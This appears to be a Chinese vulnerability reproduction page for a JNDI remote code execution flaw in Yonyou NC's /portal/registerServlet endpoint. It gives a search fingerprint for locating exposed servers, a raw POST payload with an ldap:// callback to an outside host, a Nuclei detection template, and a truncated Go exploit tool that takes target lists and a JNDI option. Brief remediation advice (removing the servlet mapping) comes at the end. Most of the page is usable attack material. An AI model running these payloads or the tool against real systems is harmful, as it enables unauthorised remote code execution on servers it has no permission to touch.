# 用友NCregisterServletJNDI远程代码执行漏洞复现(XVE-2024-10248)

- **系统**：用友　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`app="用友-UFIDA-NC"`
- **请求**：`POST /portal/registerServlet HTTP/1.1`
- **关键头**：`Host: your-ip`　`Content-Type: application/x-www-form-urlencoded`

**请求体 / payload**
```
type=1\&dsname=ldap://xxxx.dnslog.cn
DNSLOG验证
Nuclei验证漏洞
id: yonyou-nc-jndi-rce
info:
name: yonyou-nc-jndi-rce
author: HackTwo
severity: high
http:
- raw:
-
POST /portal/registerServlet HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded
type=1\&dsname=ldap://{{interactsh-url}}
matchers:
- type: dsl
dsl:
- contains(interactsh\_protocol, "dns")
condition: and
Go验证
package main
import (
"bufio"
"bytes"
"flag"
"fmt"
"io/ioutil"
"net/http"
"net/url"
"os"
"strings"
"time"
)
func usage() {
fmt.Fprintf(os.Stderr, <code>用友nc 漏洞利用； 影响version: 用友nc 6.5 & 6.3
Usage: 	./main -u <url> -d <dnslog>
./main -u <url> -j <jndi>
./main -f <file> -d <dnslog>
./main -f <file> -j <jndi>
Options:
</code>)
flag.PrintDefaults()
func urlHandler(target string) string {
if !strings.HasPrefix(target, "http") {
target = "http://" + target
if strings.HasSuffix(target, "/") {
target = strings.TrimSuffix(target, "/")
fmt.Println(target)
targetURL, err := url.Parse(target)
if err != nil {
fmt.Println("解析URL失败:", err)
return target
targetURL.Path = ""
target = targetURL.String()
return target
func getStatusCode(url string) int {
resp, err := http.Get(url)
if err != nil {
return -1
defer resp.Body.Close()
return resp.StatusCode
func readFile(filePath string) (\[]string, error) {
var lines \[]string
file, err := os.Open(filePath)
if err != nil {
return nil, err
defer file.Close()
scanner := bufio.NewScanner(file)
for scanner.Scan() {
lines = append(lines, scanner.Text())
return lines, scan…（脚本共 5361 字，完整版见原文）
```

**其他**
- 修复建议: 关闭互联网暴露面或接口设置访问权限
找到home中该目录文件hotwebs\portal\WEB-INF\web.xml。删除下面其中的两段代码，重启nc服务生效。
|     <servlet><br/>    <servlet-name>LfwSsoRegisterServlet</servlet-name><br/>    <servlet-class>nc.uap.portal.login.action.LfwSsoRegisterServlet</servlet-class><br/>    </servlet><br/>    <servlet-mapping><br/>    <servlet-name>LfwSsoRegisterServlet</servlet-name><br/>    <url-pattern>/registerServlet</url-pattern